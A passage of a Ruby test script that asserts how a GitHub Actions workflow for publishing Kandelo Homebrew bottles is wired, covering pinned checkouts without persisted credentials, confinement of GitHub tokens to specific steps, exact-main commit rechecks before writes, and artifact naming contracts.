      "name" => "Checkout exact post-build Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-postbuild", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact post-build tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-reviewed",
        "fetch-depth" => 0,
      },
    },
  ], "publisher build checkout wiring changed")
  check(checkout_view.call(upload_steps) == [
    {
      "name" => "Checkout exact Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source for upload validation", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
        "fetch-depth" => 0,
      },
    },
  ], "publisher uploader checkout wiring changed")
  check(checkout_view.call(index_steps) == [
    {
      "name" => "Checkout exact Kandelo index publisher source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source for index validation", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
        "fetch-depth" => 0,
      },
    },
  ], "publisher version-index checkout wiring changed")
  check(checkout_view.call(verify_steps) == [
    {
      "name" => "Checkout exact Kandelo verifier source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact Kandelo sysroot build source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-sysroot-build", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
        "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout reviewed Homebrew implementation for bottle verification", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
    {
      "name" => "Checkout exact post-verification Kandelo generator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-postverify", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact post-verification tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-postverify",
        "fetch-depth" => 0,
      },
    },
  ], "publisher verifier checkout wiring changed")

  [
    [build_steps, "Activate reviewed Homebrew implementation"],
    [verify_steps,
     "Activate reviewed Homebrew implementation for bottle verification"],
  ].each do |steps, name|
    activation = named_step(steps, name)
    activation_run = activation.fetch("run")
    [
      '. kandelo/scripts/homebrew-guest-layout.sh',
      'homebrew_select_guest_layout',
      'brew_prefix="$HOMEBREW_GUEST_PREFIX"',
      'bash kandelo/scripts/homebrew-prepare-host-prefix.sh',
      '--layout-mode "$HOMEBREW_GUEST_LAYOUT_MODE"',
      '--prefix "$brew_prefix"',
    ].each do |fragment|
      check(activation_run.include?(fragment),
            "publisher #{name.inspect} lacks #{fragment}")
    end
    check(!activation_run.include?('sudo install -d -o "$(id -u)"'),
          "publisher #{name.inspect} bypasses the protected prefix anchor")
  end

  host_prefix_preparer = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-prepare-host-prefix.sh")
  )
  [
    'prefix-campaign:/opt/kandelo/homebrew)',
    '"$prefix" 0 0 "$(/usr/bin/id -u)" "$(/usr/bin/id -g)"',
    '"$anchor_parent" "$trusted_uid" "$trusted_gid"',
    '"$anchor" "$trusted_uid" "$trusted_gid" "prefix anchor"',
    '"$HOMEBREW_HOST_PREFIX_INSTALL" -d',
    '"mutable Homebrew prefix must be a real non-symlink directory',
    '"mutable Homebrew bin must be a real non-symlink directory',
    'is replaceable because its owner is not trusted',
    'does not have its required trusted group',
    'A root-owned /opt/kandelo prevents the build user from renaming the',
  ].each do |fragment|
    check(host_prefix_preparer.include?(fragment),
          "host prefix preparer lacks #{fragment}")
  end
  host_prefix_preparer_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-prepare-host-prefix.sh")
  )
  [
    'absent_prefix=',
    'prefix anchor must be a real non-symlink directory',
    'prefix anchor is replaceable',
    'prefix anchor does not have its required trusted group',
    'prefix anchor parent must be traversable',
    'prefix anchor must be traversable',
    'mutable Homebrew prefix must be a real non-symlink directory',
    'not a reviewed pair',
  ].each do |fragment|
    check(host_prefix_preparer_test.include?(fragment),
          "host prefix preparer tests lack #{fragment}")
  end

  failure_condition = "${{ always() && (steps.publish-handoffs.outcome != 'success' || " \
                      "steps.validate-payload.outcome != 'success' || steps.publish.outcome != 'success') }}"
  check(checkout_view.call(finalize_steps) == [
    {
      "name" => "Checkout exact Kandelo finalizer source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact base tap without credentials", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-base",
      },
    },
    {
      "name" => "Checkout tap publication branch after payload validation",
      "if" => "${{ steps.validate-payload.outcome == 'success' }}",
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-publish", "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout clean tap for a failed-attempt report", "if" => failure_condition,
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-report", "fetch-depth" => 0,
      },
    },
  ], "publisher finalizer checkout wiring changed")
  check(checkout_view.call(vfs_release_steps) == [
    {
      "name" => "Checkout exact Kandelo VFS release source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact VFS source tap without credentials", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-base",
        "fetch-depth" => 0,
      },
    },
  ], "publisher VFS release checkout wiring changed")

  public_core_checkout.call(
    plan_steps,
    "Checkout exact public core dependency tap",
    "${{ steps.dependency-taps.outputs.core-tap-sha != '' }}",
    "${{ steps.dependency-taps.outputs.core-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )
  public_core_checkout.call(
    build_steps,
    "Checkout exact public core dependency tap for build",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )
  public_core_checkout.call(
    build_steps,
    "Checkout exact post-build core dependency tap source",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core-reviewed",
    "kandelo-postbuild"
  )
  public_core_checkout.call(
    upload_steps,
    "Checkout exact public core dependency tap for upload validation",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )
  public_core_checkout.call(
    index_steps,
    "Checkout exact public core dependency tap for index validation",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )
  public_core_checkout.call(
    verify_steps,
    "Checkout exact public core dependency tap for verification",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )
  public_core_checkout.call(
    verify_steps,
    "Checkout exact post-verification core dependency tap source",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core-postverify",
    "kandelo-postverify"
  )
  public_core_checkout.call(
    finalize_steps,
    "Checkout exact public core dependency tap for finalization",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )
  public_core_checkout.call(
    vfs_release_steps,
    "Checkout exact public core dependency tap for VFS publication",
    "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
    "${{ needs.plan.outputs.core-dependency-tap-sha }}",
    "dependency-taps/core",
    "kandelo"
  )

  build_generation = named_step(
    build_steps, "Materialize exact-main Formula runtime packages"
  )
  verify_generations = named_step(
    verify_steps, "Materialize exact-main verification runtime packages"
  )
  check(build_generation.keys.sort == %w[env if name run shell] &&
        build_generation["if"] == "${{ !inputs.dry-run }}" &&
        build_generation["shell"] == "bash" &&
        build_generation["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_SHA" => "${{ needs.plan.outputs.kandelo-sha }}",
          "PACKAGE_GENERATION_KIND" =>
            "${{ needs.plan.outputs.package-generation-kind }}",
          "PACKAGE_GENERATION_WASM32" =>
            "${{ needs.plan.outputs.package-generation-wasm32 }}",
        }, "publisher exact Formula generation mapping changed")
  check(verify_generations.keys.sort == %w[env if name run shell] &&
        verify_generations["if"] == "${{ !inputs.dry-run }}" &&
        verify_generations["shell"] == "bash" &&
        verify_generations["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_SHA" => "${{ needs.plan.outputs.kandelo-sha }}",
          "PACKAGE_GENERATION_KIND" =>
            "${{ needs.plan.outputs.package-generation-kind }}",
          "PACKAGE_GENERATION_WASM32" =>
            "${{ needs.plan.outputs.package-generation-wasm32 }}",
          "PACKAGE_GENERATION_WASM64" =>
            "${{ needs.plan.outputs.package-generation-wasm64 }}",
        }, "publisher exact browser generations mapping changed")

  common_generation_fragments = [
    "bash scripts/dev-shell.sh bash",
    ".github/scripts/prepare-homebrew-package-materializer.sh",
    '--host-target "$host"',
    "bash .github/scripts/materialize-exact-package-generations.sh",
    '--selection-kind "$PACKAGE_GENERATION_KIND"',
    '--consumer-root "$PWD"',
    '--consumer-sha "$KANDELO_SHA"',
    '--authority-xtask "$PWD/target/$host/release/xtask"',
    "--repository Automattic/kandelo",
    'resolver_index="$generation_root/resolver/index.toml"',
    'expected_index_url="file://$resolver_index"',
    'index_url="$(cat "$generation_root/index-url.txt")"',
    '[ -f "$resolver_index" ] && [ ! -L "$resolver_index" ]',
    '[ "$(realpath -- "$resolver_index")" = "$resolver_index" ]',
    '[ "$index_url" = "$expected_index_url" ]',
    'echo "WASM_POSIX_BINARY_INDEX_URL=$index_url" >> "$GITHUB_ENV"',
  ]
  build_generation_run = build_generation.fetch("run")
  verify_generations_run = verify_generations.fetch("run")
  common_generation_fragments.each do |fragment|
    check(build_generation_run.include?(fragment),
          "publisher Formula generation activation lacks #{fragment}")
    check(verify_generations_run.include?(fragment),
          "publisher browser generation activation lacks #{fragment}")
  end
  materializer_preparer = File.read(
    File.join(
      REPO_ROOT,
      ".github/scripts/prepare-homebrew-package-materializer.sh"
    )
  )
  [
    'AUTHORITY_MANIFEST="$AUTHORITY_ROOT/Cargo.toml"',
    'AUTHORITY_LOCK="$AUTHORITY_ROOT/Cargo.lock"',
    '^[A-Za-z0-9_]+(-[A-Za-z0-9_]+){2,3}$',
    "cargo fetch --locked",
    '--manifest-path "$AUTHORITY_MANIFEST"',
    '--target "$HOST_TARGET"',
    "cargo build --locked --release -p xtask",
    '--target-dir "$TARGET_DIR"',
  ].each do |fragment|
    check(materializer_preparer.include?(fragment),
          "publisher package-materializer preparation lacks #{fragment}")
  end
  fetch_index = materializer_preparer.index("cargo fetch --locked")
  build_index = materializer_preparer.index(
    "cargo build --locked --release -p xtask"
  )
  check(fetch_index && build_index && fetch_index < build_index &&
        materializer_preparer.include?(
          "the later inert-source `cargo metadata --offline` scan"
        ),
        "publisher package materializer does not fetch the complete host lock before build")
  {
    "Formula build" => build_generation_run,
    "browser verification" => verify_generations_run,
  }.each do |label, source|
    prepare_index = source.index(
      ".github/scripts/prepare-homebrew-package-materializer.sh"
    )
    activate_index = source.index(
      "bash .github/scripts/materialize-exact-package-generations.sh"
    )
    check(
      source.scan(
        ".github/scripts/prepare-homebrew-package-materializer.sh"
      ).length == 1 &&
      prepare_index && activate_index && prepare_index < activate_index,
      "publisher #{label} does not complete locked host preparation before " \
      "offline generation materialization"
    )
  end
  check(build_generation_run.include?(
          '--wasm32-tag "$PACKAGE_GENERATION_WASM32"'
        ) &&
        !build_generation_run.include?("--wasm64-tag") &&
        build_generation_run.include?(
          "Formula build/test helpers execute as universal wasm32"
        ), "publisher Formula build does not use only its exact wasm32 runtime generation")
  check(verify_generations_run.include?(
          '--wasm32-tag "$PACKAGE_GENERATION_WASM32"'
        ) &&
        verify_generations_run.include?(
          '--wasm64-tag "$PACKAGE_GENERATION_WASM64"'
        ), "publisher browser verification does not combine both exact generations")

  build_warm = named_step(build_steps, "Warm Kandelo dev shell")
  verify_warm = named_step(verify_steps, "Warm Kandelo dev shell")
  build_sysroot = named_step(build_steps, "Build Kandelo sysroot")
  verify_handoff = named_step(verify_steps, "Download strict build handoff")
  build_warm_run = <<~'BASH'
    cd kandelo
    bash scripts/dev-shell.sh bash -c '
      ruby --version
      printf "ruby=%s\n" "$(command -v ruby)" >>"$GITHUB_OUTPUT"
    '
  BASH
  check(build_steps.index(build_generation) == build_steps.index(build_warm) + 1 &&
        build_warm.keys.sort == %w[id name run shell] &&
        build_warm["id"] == "build-authority-tools" &&
        build_warm["run"] == build_warm_run &&
        build_steps.index(build_generation) < build_steps.index(build_sysroot),
        "publisher can resolve Formula runtime packages before exact generation activation")
  check(verify_steps.index(verify_generations) == verify_steps.index(verify_warm) + 1 &&
        verify_steps.index(verify_generations) < verify_steps.index(verify_handoff),
        "publisher can verify browser packages before exact generation activation")
  check(publisher_source.scan(
          /echo "WASM_POSIX_BINARY_INDEX_URL=\$index_url" >> "\$GITHUB_ENV"/
        ).length == 2 &&
        !build_generation_run.include?("binaries-abi-v") &&
        !verify_generations_run.include?("binaries-abi-v"),
        "publisher permits a mutable or non-local package resolver activation")
  exact_materializer_source = File.read(
    File.join(REPO_ROOT, ".github/scripts/materialize-exact-package-generations.sh")
  )
  durable_materializer_source = File.read(
    File.join(REPO_ROOT, ".github/scripts/materialize-durable-package-generation.sh")
  )
  [
    '--selection-kind) SELECTION_KIND="$2"',
    'rootfs-wasm32)',
    'package-generation-rootfs-wasm32-abi-v[1-9][0-9]*-sha256-[0-9a-f]{64}',
    'rootfs-wasm32 requires one rootfs wasm32 content tag and no wasm64 tag',
    '--required-package-source-sha "$CONSUMER_SHA"',
    '--base-index "$TMP_ROOT/wasm32/resolver/index.toml"',
    '--overlay-index "$TMP_ROOT/wasm64/resolver/index.toml"',
    'link_generation_archives "$TMP_ROOT/wasm32/resolver"',
    'link_generation_archives "$TMP_ROOT/wasm64/resolver"',
    'printf \'file://%s/resolver/index.toml\\n\' "$OUTPUT_DIR"',
  ].each do |fragment|
    check(exact_materializer_source.include?(fragment),
          "exact package-generation materializer lacks #{fragment}")
  end
  [
    '[ "$validated_main_sha" != "$REQUIRED_PACKAGE_SOURCE_SHA" ]',
    "generation validation differs from the required exact main commit",
    'archive_source_args=(--package-source-sha "$package_producer_sha")',
    'run_without_credentials "$AUTHORITY_XTASK" staging-reuse validate-generation',
    '--source-release-tag "$source_release_tag"',
    '[ "$(git -C "$CONSUMER_ROOT" rev-parse HEAD)" != "$CONSUMER_SHA" ]',
    'printf \'file://%s/resolver/index.toml\\n\' "$OUTPUT_DIR"',
  ].each do |fragment|
    check(durable_materializer_source.include?(fragment),
          "durable package-generation materializer lacks #{fragment}")
  end

  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
    HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  plan_credential_steps = plan_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(plan_credential_steps.map { |step| step["name"] } == [
    "Admit exact Kandelo main source",
    "Admit prefix-campaign Kandelo main history",
    "Bind write tap source to protected main history",
    "Admit exact prior-run revalidation evidence",
    "Materialize sealed prefix-campaign tap source",
  ] && plan_credential_steps.all? do |step|
    step.fetch("env").slice(*credential_names) == {
      "GH_TOKEN" => "${{ github.token }}",
    }
  end, "publisher plan credential escapes source validation")
  {
    build_steps => [
      "Materialize exact-main Formula runtime packages",
      "Prepare sealed campaign Formula dependencies",
      "Recreate sealed campaign source for post-build review",
    ],
    verify_steps => [
      "Materialize exact-main verification runtime packages",
      "Prepare sealed campaign dependencies for verification",
      "Recreate sealed campaign source for post-verification review",
    ],
  }.each do |steps, expected_names|
    credential_steps = steps.select do |step|
      !(step.fetch("env", {}).keys & credential_names).empty?
    end
    check(credential_steps.map { |step| step["name"] } == expected_names &&
          credential_steps.all? do |step|
            step.fetch("env").slice(*credential_names) == {
              "GH_TOKEN" => "${{ github.token }}",
            }
          end,
          "publisher read credential escapes exact public-generation metadata fetch")
    check(steps.select { |step| step["uses"] == CHECKOUT_ACTION }.all? do |step|
      step.dig("with", "persist-credentials") == false
    end, "unprivileged publisher phase persists checkout credentials")
  end
  uploader_credential_steps = upload_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(uploader_credential_steps.map { |step| step["name"] } ==
        [
          "Materialize sealed campaign source for upload validation",
          "Upload validated bottle in isolated ORAS auth state",
        ] &&
        uploader_credential_steps.first.fetch("env").slice(
          *credential_names
        ) == { "GH_TOKEN" => "${{ github.token }}" } &&
        uploader_credential_steps.last["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_KANDELO_COMMIT" =>
            "${{ needs.plan.outputs.kandelo-sha }}",
          "KANDELO_HOMEBREW_TAP_COMMIT" =>
            "${{ needs.plan.outputs.tap-sha }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
          "PREFIX_CAMPAIGN_MODE" =>
            "${{ needs.plan.outputs.prefix-campaign-mode }}",
        },
        "publisher uploader credentials escape the isolated upload step")
  index_credential_steps = index_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(index_credential_steps.map { |step| step["name"] } ==
        [
          "Materialize sealed campaign source for index validation",
          "Publish the complete Homebrew version index in isolated ORAS auth state",
        ] &&
        index_credential_steps.first.fetch("env").slice(
          *credential_names
        ) == { "GH_TOKEN" => "${{ github.token }}" } &&
        index_credential_steps.last["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_KANDELO_COMMIT" =>
            "${{ needs.plan.outputs.kandelo-sha }}",
          "KANDELO_HOMEBREW_TAP_COMMIT" =>
            "${{ needs.plan.outputs.tap-sha }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
          "PREFIX_CAMPAIGN_MODE" =>
            "${{ needs.plan.outputs.prefix-campaign-mode }}",
        },
        "publisher version-index credentials escape the isolated transport step")
  finalizer_credential_steps = finalize_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(finalizer_credential_steps.map { |step| step["name"] } == [
    "Atomically compose and publish all sidecars under one tap state lock",
    "Record failed attempt without replacing last-green metadata",
  ] && finalizer_credential_steps.all? do |step|
    step.fetch("env").slice(*credential_names) == { "GH_TOKEN" => "${{ github.token }}" }
  end, "publisher finalizer credentials escape tap write steps")
  vfs_release_credential_steps = vfs_release_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(vfs_release_credential_steps.map { |step| step["name"] } == [
    "Publish and anonymously read back the immutable VFS release",
  ] && vfs_release_credential_steps.first.fetch("env").slice(*credential_names) == {
    "GH_TOKEN" => "${{ github.token }}",
  }, "publisher VFS release credential escapes the sole write step")
  vfs_release_checkout_steps = vfs_release_steps.select { |step| step["uses"] == CHECKOUT_ACTION }
  check(vfs_release_checkout_steps.all? do |step|
    step.dig("with", "persist-credentials") == false
  end, "publisher VFS release persists checkout credentials")

  exact_main_helper_path = File.join(
    REPO_ROOT, ".github/scripts/require-exact-kandelo-main.sh"
  )
  exact_main_helper = File.read(exact_main_helper_path)
  check((File.stat(exact_main_helper_path).mode & 0o111).positive?,
        "exact-main publication helper is not executable")
  [
    '[ "$REPOSITORY" != "Automattic/kandelo" ]',
    '[[ "$SOURCE_SHA" =~ ^[0-9a-f]{40}$ ]]',
    '[ -z "${GH_TOKEN:-}" ]',
    '"/repos/$REPOSITORY/git/ref/heads/main"',
    "--jq .object.sha",
    '[[ "$main_sha" =~ ^[0-9a-f]{40}$ ]]',
    '[ "$SOURCE_SHA" != "$main_sha" ]',
    "source SHA must equal the current refs/heads/main commit",
  ].each do |fragment|
    check(exact_main_helper.include?(fragment),
          "exact-main publication helper lacks #{fragment}")
  end
  check(%w[merge-base rev-list compare/ refs/tags/ refs/pull/].none? do |fragment|
    exact_main_helper.include?(fragment)
  end, "exact-main publication helper accepts graph or alternate-ref substitutes")
  upload_write = named_step(
    upload_steps, "Upload validated bottle in isolated ORAS auth state"
  )
  check_exact_main_recheck(
    upload_write.fetch("run"),
    "bash scripts/dev-shell.sh bash scripts/homebrew-ghcr-upload.sh",
    "publisher bottle upload",
    helper: ".github/scripts/require-exact-kandelo-main.sh"
  )
  index_write = named_step(
    index_steps,
    "Publish the complete Homebrew version index in isolated ORAS auth state"
  )
  check_exact_main_recheck(
    index_write.fetch("run"),
    "bash scripts/dev-shell.sh bash scripts/homebrew-ghcr-upload.sh",
    "publisher version-index upload",
    helper: ".github/scripts/require-exact-kandelo-main.sh"
  )
  finalizer_write = named_step(
    finalize_steps, "Atomically compose and publish all sidecars under one tap state lock"
  )
  check_exact_main_recheck(
    finalizer_write.fetch("run"),
    "bash scripts/dev-shell.sh env",
    "publisher tap finalization",
    helper: ".github/scripts/require-exact-kandelo-main.sh"
  )
  failure_write = named_step(
    finalize_steps, "Record failed attempt without replacing last-green metadata"
  )
  check(failure_write.fetch("run").include?(
          '--exact-kandelo-main-sha "$KANDELO_HOMEBREW_KANDELO_COMMIT"'
        ), "publisher failure report drops exact-main authority before the tap writer")
  check_exact_main_recheck(
    failure_write.fetch("run"),
    "bash scripts/dev-shell.sh env",
    "publisher failed-attempt report",
    helper: ".github/scripts/require-exact-kandelo-main.sh"
  )
  vfs_write = named_step(
    vfs_release_steps, "Publish and anonymously read back the immutable VFS release"
  )
  check_exact_main_recheck(
    vfs_write.fetch("run"),
    "bash kandelo/scripts/homebrew-publish-vfs-release.sh",
    "publisher immutable VFS release",
    helper: "kandelo/.github/scripts/require-exact-kandelo-main.sh"
  )

  build_handoff_name =
    "${{ needs.plan.outputs.artifact-name-prefix }}" \
    "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}-" \
    "attempt-${{ github.run_attempt }}"
  upload_receipt_name =
    "homebrew-upload-receipt-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  publish_handoff_name =
    "${{ needs.plan.outputs.artifact-name-prefix }}" \
    "homebrew-publish-handoff-${{ matrix.formula }}-${{ matrix.arch }}-" \
    "attempt-${{ github.run_attempt }}"
  child_layout_name =
    "${{ needs.plan.outputs.artifact-name-prefix }}" \
    "homebrew-oci-child-${{ matrix.formula }}-${{ matrix.arch }}-" \
    "attempt-${{ github.run_attempt }}"
  index_publication_name =
    "homebrew-index-publication-${{ matrix.formula }}-attempt-${{ github.run_attempt }}"
  vfs_release_handoff_name =
    "homebrew-vfs-release-handoff-${{ matrix.formula }}-wasm32-attempt-${{ github.run_attempt }}"
  vfs_release_receipt_name =
    "homebrew-vfs-release-receipt-${{ needs.plan.outputs.vfs-acceptance-formula }}-wasm32-attempt-${{ github.run_attempt }}"
  build_handoff_upload = named_step(build_steps, "Upload strict bottle build handoff")
  check(build_handoff_upload["uses"] == UPLOAD_ACTION && build_handoff_upload["with"] == {
    "name" => build_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-build-handoff",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher build handoff artifact contract changed")
  child_layout_upload = named_step(build_steps, "Upload deterministic Homebrew OCI child")
  check(child_layout_upload["uses"] == UPLOAD_ACTION && child_layout_upload["with"] == {
    "name" => child_layout_name,
    "path" => "${{ runner.temp }}/homebrew-oci-child",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher OCI child artifact contract changed")
  build_diagnostics = named_step(
    build_steps, "Upload unprivileged build diagnostics"
  )
  check(
    build_diagnostics.dig("with", "name") ==
      "${{ needs.plan.outputs.artifact-name-prefix }}" \
      "homebrew-build-diagnostics-${{ matrix.formula }}-" \
      "${{ matrix.arch }}-attempt-${{ github.run_attempt }}",
    "publisher build diagnostics artifact namespace changed"
  )
  upload_handoff_download = named_step(upload_steps, "Download strict build handoff")
  verify_handoff_download = named_step(verify_steps, "Download strict build handoff")
  [upload_handoff_download, verify_handoff_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "build-handoff" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => build_handoff_name,
            "path" => "${{ runner.temp }}/homebrew-build-handoff",
          }, "publisher build handoff download contract changed")
  end
  upload_child_download = named_step(upload_steps, "Download deterministic Homebrew OCI child")
  verify_child_download = named_step(
    verify_steps, "Download deterministic Homebrew OCI child for dry-run validation"
  )
  [upload_child_download, verify_child_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "oci-child" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => child_layout_name,
            "path" => "${{ runner.temp }}/homebrew-oci-child",
          }, "publisher OCI child download contract changed")
  end
  receipt_upload = named_step(upload_steps, "Upload strict upload receipt")
  check(receipt_upload["uses"] == UPLOAD_ACTION && receipt_upload["with"] == {
    "name" => upload_receipt_name,
    "path" => "${{ runner.temp }}/homebrew-upload-receipt/receipt.json",
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher upload receipt artifact contract changed")
  receipt_download = named_step(verify_steps, "Download strict upload receipt")
  check(receipt_download["uses"] == DOWNLOAD_ACTION && receipt_download["id"] == "upload-receipt" &&
        receipt_download["if"] == "${{ !inputs.dry-run }}" &&
        receipt_download["continue-on-error"] == true && receipt_download["with"] == {
          "name" => upload_receipt_name,
          "path" => "${{ runner.temp }}/homebrew-upload-receipt",
  }, "publisher receipt download contract changed")
  index_child_download = named_step(index_steps, "Download immutable OCI child layouts")
  check(index_child_download["uses"] == DOWNLOAD_ACTION && index_child_download["with"] == {
    "pattern" => "homebrew-oci-child-${{ matrix.formula }}-*-attempt-${{ github.run_attempt }}",
    "path" => "${{ runner.temp }}/homebrew-oci-children",
    "merge-multiple" => false,
  }, "publisher version-index child artifact download contract changed")
  index_receipt_download = named_step(
    index_steps, "Download public child publication receipts"
  )
  check(index_receipt_download["uses"] == DOWNLOAD_ACTION && index_receipt_download["with"] == {
    "pattern" => "homebrew-upload-receipt-${{ matrix.formula }}-*-attempt-${{ github.run_attempt }}",
    "path" => "${{ runner.temp }}/homebrew-child-publications",
    "merge-multiple" => false,
  }, "publisher version-index publication artifact download contract changed")
  index_publication_upload = named_step(index_steps, "Upload public Homebrew version-index evidence")
  check(index_publication_upload["uses"] == UPLOAD_ACTION &&
        index_publication_upload["with"] == {
          "name" => index_publication_name,
          "path" => "${{ runner.temp }}/homebrew-complete-index/layout-receipt.json\n" \
                    "${{ runner.temp }}/homebrew-complete-index/transport-receipt.json\n",
          "compression-level" => 0,
          "if-no-files-found" => "error", "retention-days" => 2,
        }, "publisher version-index publication artifact contract changed")
  index_publication_download = named_step(
    verify_steps, "Download public Homebrew version-index evidence"
  )
  check(index_publication_download["uses"] == DOWNLOAD_ACTION &&
        index_publication_download["id"] == "index-publication" &&
        index_publication_download["if"] == "${{ !inputs.dry-run }}" &&
        index_publication_download["continue-on-error"] == true &&
        index_publication_download["with"] == {
          "name" => index_publication_name,
          "path" => "${{ runner.temp }}/homebrew-index-publication",
        }, "publisher version-index evidence download contract changed")

  {
    "Download exact prior-run build handoff" => [
      "build_handoff",
      "${{ runner.temp }}/homebrew-build-handoff",
    ],
